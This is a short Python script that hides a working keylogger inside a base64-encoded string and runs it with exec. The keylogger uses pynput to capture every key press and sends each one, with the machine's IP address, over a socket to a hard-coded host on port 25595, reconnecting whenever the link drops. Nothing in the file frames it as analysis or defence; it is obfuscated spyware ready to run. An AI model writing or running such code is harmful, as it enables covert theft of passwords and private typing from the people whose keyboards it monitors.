import base64

clientcode = servercode = base64.b64encode(b"""
import pynput
from pynput.keyboard import Key, Listener
import socket
from time import sleep

hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)

s = socket.socket()
s.connect(("192.168.178.112", 25595))

def on_press(key):
    try:
        s.send(f"{ip} {key}".encode())
    except:
        s.close()
        while True:
            try:
                s.connect(("192.168.178.112", 25595))
            except:
                pass


with Listener(on_press=on_press) as Listener:
    Listener.join()""")

exec(base64.b64decode(servercode))
